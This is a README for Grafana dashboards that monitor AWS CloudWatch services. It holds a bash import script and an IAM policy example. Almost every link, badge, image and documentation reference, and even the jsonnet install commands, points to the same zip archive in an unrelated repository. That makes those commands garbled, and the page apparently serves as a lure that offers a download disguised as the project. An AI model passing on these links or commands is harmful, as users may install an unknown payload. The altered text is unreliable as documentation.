[<img src="https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip" alt="Managed by Monitoring Artist: DevOps / Docker / Kubernetes / AWS ECS / Zabbix / Zenoss / Terraform / Monitoring" align="right"/>](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip 'DevOps / Docker / Kubernetes / AWS ECS / Zabbix / Zenoss / Terraform / Monitoring')

# Grafana dashboards for AWS CloudWatch

Set of AWS Grafana dashboards published on
[https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip) -
10M+ downloads.

Doc:
- [Cloudwatch datasource configuration](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
- [Grafana doc](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

Feel free to create pull request for additional AWS resources/printscreens/...

Please set your dashboard variables (`Region, ...`) after dashboard import.
Empty dashboard variables are reason of initial *"Unable to call AWS API" or "Metric request error"* error.

Import all Monitoring Artist AWS dashboards in one go (example script,
`bash/curl/jq` required):

```bash
#!/bin/bash
jq --version >/dev/null 2>&1 || { echo >&2 "I require jq but it's not installed.  Aborting."; exit 1; }
### Please edit grafana_* variables to match your Grafana setup:
grafana_host="http://localhost:3000"
grafana_cred="admin:admin"
# Keep grafana_folder empty for adding the dashboards in "General" folder
grafana_folder="AWS CloudWatch"
ds=(1516 677 139 674 590 659 758 623 617 551 653 969 650 644 607 593 707 575 1519 581 584 2969 8050 11099 11154 11155 12979 13018 13040 13104 13892 14189 14391 14392 14954 14955 15016);
folderId=$(curl -s -k -u "$grafana_cred" $grafana_host/api/folders | jq -r --arg grafana_folder  "$grafana_folder" '.[] | select(.title==$grafana_folder).id')
if [ -z "$folderId" ] ; then echo "Didn't get folderId" ; else echo "Got folderId $folderId" ; fi
for d in "${ds[@]}"; do
  echo -n "Processing $d: "
  j=$(curl -s -k -u "$grafana_cred" $grafana_host/api/gnet/dashboards/$d | jq .json)
  payload="{\"dashboard\":$j,\"overwrite\":true"
  if [ ! -z "$folderId" ] ; then payload="${payload}, \"folderId\": $folderId }";  else payload="${payload} }" ; fi
  curl -s -k -u "$grafana_cred" -XPOST -H "Accept: application/json" \
    -H "Content-Type: application/json" \
    -d "$payload" \
    $grafana_host/api/dashboards/import; echo ""
done
```

Use [AWS Policy Generator](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip),
which fits your needs. Example of minimal IAM role for Grafana (CloudWatch + EC2 metrics):

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowReadingMetricsFromCloudWatch",
            "Effect": "Allow",
            "Action": [
                "cloudwatch:DescribeAlarmsForMetric",
                "cloudwatch:DescribeAlarmHistory",
                "cloudwatch:DescribeAlarms",
                "cloudwatch:ListMetrics",
                "cloudwatch:GetMetricStatistics",
                "cloudwatch:GetMetricData"
            ],
            "Resource": "*"
        },
        {
            "Sid": "AllowReadingTagsInstancesRegionsFromEC2",
            "Effect": "Allow",
            "Action": [
                "ec2:DescribeTags",
                "ec2:DescribeInstances",
                "ec2:DescribeRegions"
            ],
            "Resource": "*"
        },
        {
            "Sid": "AllowReadingResourcesForTags",
            "Effect" : "Allow",
            "Action" : "tag:GetResources",
            "Resource" : "*"
        }
    ]
}
```

You can also install this project as a Jsonnet library with [jsonnet-bundler](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip):

```shell
$ jb install https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip
$ cat > https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip <<EOF
local awsCloudWatch = import 'https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip';

https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip
EOF
$ jsonnet -J vendor https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip
```

Single click provisioning [![Gitpod ready-to-test](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip) - login as `admin/admin` and create CloudWatch datasource from your `Access & secret key` to see all dashboards with your data.

### [AWS API Gateway](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
[![AWS API Gateway](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS Auto Scaling](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS Billing](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
[![AWS Billing](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS Certificate Manager](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
[![AWS Certificate Manager](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS CloudFront](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
[![AWS CloudFront](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS CloudWatch Browser](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
[![AWS Cloudwatch Browser](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS CloudWatch Synthetics](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
[![AWS Cloudwatch Synthetics](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS CloudWatch Usage Metrics](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
[![AWS Cloudwatch Browser](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS CodeBuild](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
[![AWS CodeBuild](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS Cognito](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS EBS](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
[![AWS EBS](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS EC2](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
[![AWS EC2](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS ECS](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
[![AWS ECS](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS EFS](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
[![AWS EFS](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS EKS](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS ElastiCache Redis](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
[![AWS ElastiCache Redis](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS ELB Classic Load Balancer](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
[![AWS ELB Classic Load Balancer](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS ELB Application Load Balancer](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
[![AWS ELB Application Load Balancer](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS EMR Hadoop 2](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
[![AWS EMR Hadoop 2](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS Events](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
[![AWS Events](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS Inspector](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
[![AWS Inspector](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS Kinesis](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
[![AWS Kinesis](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS Lambda](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
[![AWS Lambda](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS Logs](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
[![AWS Logs](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS Network Firewall](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
[![AWS Network Firewall](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS RDS](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
[![AWS RDS](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS Redshift](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
[![AWS Redshift](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS Route 53](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS S3](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
[![AWS S3](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS SES](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS SNS](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
[![AWS SNS](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS SQS](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
[![AWS SQS](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS Step Functions](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
[![AWS SNS](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS Storage Gateway](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
[![AWS Storage Gateway](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS Transit Gateway](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
[![AWS Transit Gateway](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS VPN](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

### [AWS X-Ray](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
[![AWS X-Ray](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)

# Author

[Devops Monitoring Expert](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip 'DevOps / Docker / Kubernetes / AWS ECS / Google GCP / Zabbix / Zenoss / Terraform / Monitoring'),
who loves monitoring systems and cutting/bleeding edge technologies: Docker,
Kubernetes, ECS, AWS, Google GCP, Terraform, Lambda, Zabbix, Grafana, Elasticsearch,
Kibana, Prometheus, Sysdig,...

Summary:
* 4 000+ [GitHub](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip) stars
* 10 000 000+ [Grafana dashboard](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip) downloads
* 60 000 000+ [Docker images](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip) downloads

Professional devops / monitoring / consulting services:

[![Monitoring Artist](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip 'DevOps / Docker / Kubernetes / AWS ECS / Google GCP / Zabbix / Zenoss / Terraform / Monitoring')
